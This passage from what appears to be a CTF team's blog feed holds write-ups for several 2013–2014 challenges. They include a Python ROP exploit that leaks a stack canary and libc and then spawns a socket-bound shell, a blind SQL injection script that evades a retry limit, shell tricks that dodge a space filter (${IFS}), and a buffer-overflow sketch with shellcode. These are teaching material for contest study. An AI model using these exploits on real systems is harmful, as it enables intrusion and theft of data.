<p>Back to the main procedure, the program immediately check if the code given contains only 3 possible chars (whose ascii value mod 16 = 1,2,3 respectively and later we used ‘1’,’2’, and ‘3’) and the numbers of them (equals v1, v2 and v3 respectively).</p>

<p>After this step, the program will output</p>

<pre><code>[*] Verifying your code
</code></pre>

<p>Following comes the automata part.</p>

<p>The program then creates 3 pipes and uses fcntl() to mark the readding ends (whose file descriptors are fd+1, fd+3, and fd+5, where fd is the descriptor of network, or 4) with O_NONBLOCK.
Then it calls fork() to create a child process keeps reading from fd+1 and fd+3.
The child also calls a function at 0x11b2, which output a percentage calculated by the argument over 43, i.e., the length of the code.
Then the child calls 0x127f with the address of code, a index, three file descriptors and a signal.</p>

<p>In the function it first checks if it has come to the end of the code. If so, send the signal passed by the argument. Otherwise, add 1 to the index and write to one of the 3 file descriptors according to the char pointed by the index.</p>

<p>The left part of program creats another 7 child processes. Therefore we have an automata whose states are processes and the transfer function is implied by the pipes.</p>

<p>To find the transfer function, we attached gdb to the main process and watch the address where the argument of pipe() lies.</p>

<p>The pipe info is like this (numbers in the brackets are the state indices and those outside the brackets indicates the corresponding code):</p>

<pre><code>(1)&lt;--(Start)
(1)&lt;--(1)1,2
(2)&lt;--(1)3
(8)&lt;--(2)3
(3)&lt;--(2)1
(2)&lt;--(3)1
(5)&lt;--(2)2
(2)&lt;--(5)2
(2)&lt;--(6)3
(4)&lt;--(3)2
(3)&lt;--(4)2
(8)&lt;--(3)3
(6)&lt;--(4)3
(5)&lt;--(4)1
(4)&lt;--(5)1
(8)&lt;--(5)3
(7)&lt;--(6)1,2
(6)&lt;--(7)1,2
(8)&lt;--(7)3
(8)&lt;--(8)1,2,3
</code></pre>

<p>Then we work out a figure (See Figure 1).</p>

<p><img src="http://www.blue-lotus.net/images/2014/graph-automata1.png" alt="1" />
Figure 1</p>

<p>We also found that the program calls system() at function 0x124e, therefore the goal is to enter this address.</p>

<p>Trace back and it seems that only when SIGUSR1 is received can the program execute the key function.</p>

<p>Therefore we should make sure that after 43 codes are executed, the state is at any node other than the 8-th state.</p>

<p>Seems that for most of the states, code ‘3’ will lead to 8-th state. Fortunately, the cycle connecting state 2, 3, 4, and 6 containing code ‘3’ and we use it to easily construct the code correspounding to the command.</p>

<p>The command is filtered by strtok(), which split the command at white chars (‘ ‘, ‘\t’, ‘\n’, ‘\r’,’&#8221;’,’&#8217;’).</p>

<p>Then we want to get a shell by system command, and we tried</p>

<pre><code>bash&lt;&amp;4&gt;&amp;4
sh&lt;&amp;4&gt;&amp;4
dash&lt;&amp;4&gt;&amp;4
</code></pre>

<p>It failed. Maybe because the organizer keeps monitor bash for security reasons.</p>

<pre><code>ls&gt;&amp;4 shows there is a file called key.
</code></pre>

<p>After all, we come up an idea to represent space with $(IFS)</p>

<pre><code>cat${IFS}key
</code></pre>

<p>And the flag is got.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Angry Doraemon writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-angry_doraemon-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-angry_doraemon-writeup</id>
    <content type="html"><![CDATA[<h2 id="vulnerabilities">Vulnerabilities</h2>
<p>After reversing the binary, we found several vulnerabilities as below:</p>

<ol>
  <li>There is a suspected backdoor <code>execl('/bin/sh')</code> in the option <code>1.Sword</code>, but as a remote service, the local shell cannot interact with the client side;</li>
  <li>There is an arbitrary address jump in the option <code>5.Fist attack</code>, but the addresses that start with “0x08” is not allowed;</li>
  <li>There is a buffer overflow bug in the option <code>4.Throw mouse </code>. Although the related function is protected by stack canary, we can leak the whole canary by overwriting the  first byte 0x00 in the canary. </li>
</ol>

<p>The 3rd vulnerability is easier to exploit. We choose it to do exploitation.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Exploitation steps are as below:</p>

<ol>
  <li>Leak the stack canary and stack address in the option <code>5.Fist attack</code> handler;</li>
  <li>Launch ROP attack to call write() in the PLT to leak libc address(e.g. write() in GOT), and then we can calculate the address of system()</li>
  <li>Launch ROP attack to call system(), and the shell command can be put in the stack since we already know the stack address in step 1</li>
</ol>

<h2 id="code">Code</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">sys</span>
</span><span class="line">
</span><span class="line"><span class="n">host</span> <span class="o">=</span> <span class="s">&quot;58.229.183.18&quot;</span>
</span><span class="line"><span class="n">port</span> <span class="o">=</span> <span class="mi">8888</span>
</span><span class="line">
</span><span class="line"><span class="c"># STEP1: leak stack canary and stack address</span>
</span><span class="line"><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_read</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">print_write</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</span><span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;y&quot;</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">10</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;4444&quot;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;You choose &#39;&quot;</span><span class="p">)</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;&#39;!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class="line"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">before</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">):]</span>
</span><span class="line"><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">leak</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span>
</span><span class="line"><span class="n">stack_ref</span> <span class="o">=</span> <span class="n">l32</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">7</span><span class="p">])</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] canary: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] stack addr ref: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_ref</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># STEP2: leak libc address</span>
</span><span class="line"><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_read</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">print_write</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</span><span class="line"><span class="n">write_plt</span> <span class="o">=</span> <span class="mh">0x80486e0</span>
</span><span class="line"><span class="n">write_got</span> <span class="o">=</span> <span class="mh">0x804b040</span>
</span><span class="line"><span class="n">fd</span> <span class="o">=</span> <span class="mi">4</span>
</span><span class="line"><span class="n">junk</span> <span class="o">=</span> <span class="s">&quot;JJJJ&quot;</span>
</span><span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;y&quot;</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">junk</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;4444&quot;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Are you sure? (y/n) &quot;</span><span class="p">)</span>
</span><span class="line"><span class="n">write</span> <span class="o">=</span> <span class="n">l32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span><span class="line"><span class="n">system</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="mh">0xe0910</span> <span class="o">+</span> <span class="mh">0x41260</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] write: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] system: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># STEP3: pwn</span>
</span><span class="line"><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_read</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">print_write</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</span><span class="line"><span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;sh 0&lt;&amp;4 1&gt;&amp;4</span><span class="se">\x00</span><span class="s">&quot;</span>
</span><span class="line"><span class="n">cmd_addr</span> <span class="o">=</span> <span class="mh">0xbfc56788</span> <span class="o">-</span> <span class="mh">0xbfc56798</span> <span class="o">+</span> <span class="n">stack_ref</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] cmd address: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cmd_addr</span><span class="p">)</span>
</span><span class="line"><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;y&quot;</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">9</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">junk</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">l32</span><span class="p">(</span><span class="n">cmd_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">cmd</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;4444&quot;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&quot;Are you sure? (y/n) &quot;</span><span class="p">)</span>
</span><span class="line"><span class="k">print</span> <span class="s">&quot;[+] We&#39;ve got a shell;-)&quot;</span>
</span><span class="line"><span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 120 writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-120-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-120-writeup</id>
    <content type="html"><![CDATA[<h2 id="analysis">Analysis</h2>

<h3 id="sql-injection">SQL Injection</h3>

<p>There’s an SQL injection at </p>

<pre><code>  $query = "select * from rms_120_pw where (ip='$_SERVER[REMOTE_ADDR]') and (password='$_POST[password]')";
</code></pre>

<p>and the keyword filter does NOT filter blind injection.</p>

<pre><code>  if (eregi("replace|load|information|union|select|from|where|limit|offset|order|by|ip|\.|#|-|/|\*",$_POST['password'])){
</code></pre>

<p>so we can post password=</p>

<pre><code>' or (CONDITION) and '1'='1
</code></pre>

<p>to test whether the CONDITION is true of fasle.</p>

<p>And we can use binary search to get every byte of password.</p>

<p>But there’s ONE more limit. The retry time is only 120 times. But <code>log(26)*30 &gt; 120</code>.</p>

<h3 id="by-pass-120-times-limit">By-pass 120 times limit</h3>

<p>The retry is limited to 120 times by the following code.</p>

<pre><code>if ( !isset($_SESSION['cnt'])){
    $_SESSION['cnt']=0;
    $_SESSION['password']=RandomString();
    
    $query = "delete from rms_120_pw where ip='$_SERVER[REMOTE_ADDR]'";
    @mysql_query($query);
    
    $query = "insert into rms_120_pw values('$_SERVER[REMOTE_ADDR]',             '$_SESSION[password]')";
    @mysql_query($query);
}
</code></pre>

<p>There’s one way to bypass it.</p>

<p>We need to make serveral queries without any session to get multiple sessions. And each time we request, the password is reset to another random value, so only the password generated in the last query is acceptable. But the <code>$_SESSION['cnt']</code> is still 120 for previous sessions. We can get at most <code>120 * num_of_sessions</code> times to do binary search blind injection.</p>

<h2 id="exploit-code">Exploit Code</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/env python2</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">requests</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="n">ss</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class="line">
</span><span class="line"><span class="n">session_pool</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">(),</span>
</span><span class="line">        <span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">counter</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="mi">1</span><span class="p">,</span>
</span><span class="line">        <span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class="line"><span class="nb">id</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">sss</span> <span class="ow">in</span> <span class="n">session_pool</span><span class="p">:</span>
</span><span class="line">    <span class="k">assert</span> <span class="n">sss</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                    <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR LENGTH(password) = 30 AND &#39;1&#39;= &#39;1&quot;</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                <span class="p">)</span><span class="o">.</span><span class="n">text</span> <span class="o">==</span> <span class="s">u&#39;True&#39;</span>
</span><span class="line">
</span><span class="line">
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">31</span><span class="p">):</span>
</span><span class="line">    <span class="n">l</span> <span class="o">=</span> <span class="mi">97</span>
</span><span class="line">    <span class="n">r</span> <span class="o">=</span> <span class="mi">122</span>
</span><span class="line">    <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class="line">        <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">        <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                    <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) &gt;= </span><span class="si">%d</span><span class="s"> AND &#39;1&#39;= &#39;1&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span><span class="line">                    <span class="p">}</span>
</span><span class="line">                <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span class="line">        <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">        <span class="k">if</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class="line">            <span class="nb">id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">            <span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">        <span class="k">if</span> <span class="s">&#39;True&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
</span><span class="line">            <span class="n">l</span> <span class="o">=</span> <span class="n">j</span>
</span><span class="line">            <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">            <span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="n">l</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
</span><span class="line">                <span class="n">res2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/&#39;</span><span class="p">,</span>
</span><span class="line">                        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">                            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&quot;&#39; OR ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s"> AND &#39;1&#39;= &#39;1&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span><span class="line">                            <span class="p">}</span>
</span><span class="line">                        <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span><span class="line">                <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">                <span class="k">if</span> <span class="n">counter</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span><span class="line">                    <span class="nb">id</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class="line">                    <span class="n">s</span> <span class="o">=</span> <span class="n">session_pool</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span>
</span><span class="line">
</span><span class="line">                <span class="k">if</span> <span class="s">&#39;True&#39;</span> <span class="ow">in</span> <span class="n">res2</span><span class="p">:</span>
</span><span class="line">                    <span class="k">print</span> <span class="n">j</span>
</span><span class="line">                    <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span><span class="line">                    <span class="k">break</span>
</span><span class="line">                <span class="k">else</span><span class="p">:</span>
</span><span class="line">                    <span class="k">print</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class="line">                    <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</span><span class="line">                    <span class="k">break</span>
</span><span class="line">            <span class="k">elif</span> <span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">:</span>
</span><span class="line">                <span class="k">print</span> <span class="n">l</span>
</span><span class="line">                <span class="n">ss</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
</span><span class="line">                <span class="k">break</span>
</span><span class="line">        <span class="k">else</span><span class="p">:</span>
</span><span class="line">            <span class="n">r</span> <span class="o">=</span> <span class="n">j</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class="line">            <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">ss</span><span class="p">))</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/auth.php&#39;</span><span class="p">,</span>
</span><span class="line">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span><span class="line">            <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">ss</span><span class="p">))</span>
</span><span class="line">            <span class="p">}</span>
</span><span class="line">        <span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF Quals 2013 Exploitation 300 writeup]]></title>
    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup/"/>
    <updated>2013-09-24T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup</id>
    <content type="html"><![CDATA[<p>That is a network service. I can connect it by netcat. then i must input <strong>username</strong> <strong>password</strong> and seomething else.</p>

<p><img src="http://www.blue-lotus.net/images/2013/nclogin.png" alt="1" /></p>

<p>After i analysis the service. I find out the process of login and i find the <strong>username</strong> and <strong>password</strong></p>

<p><img src="http://www.blue-lotus.net/images/2013/username.png" alt="2" /> <img src="http://www.blue-lotus.net/images/2013/password.png" alt="3" /> <img src="http://www.blue-lotus.net/images/2013/dbup.png" alt="4" /></p>

<p>Then I input username and password. I input a number(<strong>size</strong>) and a string(<strong>buff</strong>). </p>

<p>“size” &gt; 1 and “size” + 1 &lt; 0x400</p>

<p><img src="http://www.blue-lotus.net/images/2013/size.png" alt="5" /></p>

<p>Then I input The buff and the buff must ASCII Characters.</p>

<p>last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.</p>

<p>there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. </p>

<p><code>
0xffff + 1 == ； 0 0xffff == 65535
</code></p>

<p>now we can input any string which we want :)</p>

<p>then i will write the exp.</p>

<p><code>
'A' * 0x420 + ret_address
</code>
there is not “jmp esp” in program when i use objdump. but the program use the function of read. i can use <strong>read</strong> to write “jmp esp” in static area.</p>

<p>read(fd, buff, buffsize)</p>

<p>read: call   80486e0 <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;">&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;</a> </p>

<p>fd:4 (the fd of client socket)</p>

<p>read( 4, *0x080486e0, 2)</p>

<p>now the send “jmp esp” and the program will write in memory.</p>

<p><code>
'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
</code></p>

<p>now I did it.use the exp and use <strong>nc</strong> connect remote server.</p>

<p><img src="http://www.blue-lotus.net/images/2013/exp.png" alt="6" /></p>

<p><img src="http://www.blue-lotus.net/images/2013/remote.png" alt="7" /></p>

<h2 id="exp">Exp</h2>

<div><div class="CodeRay">
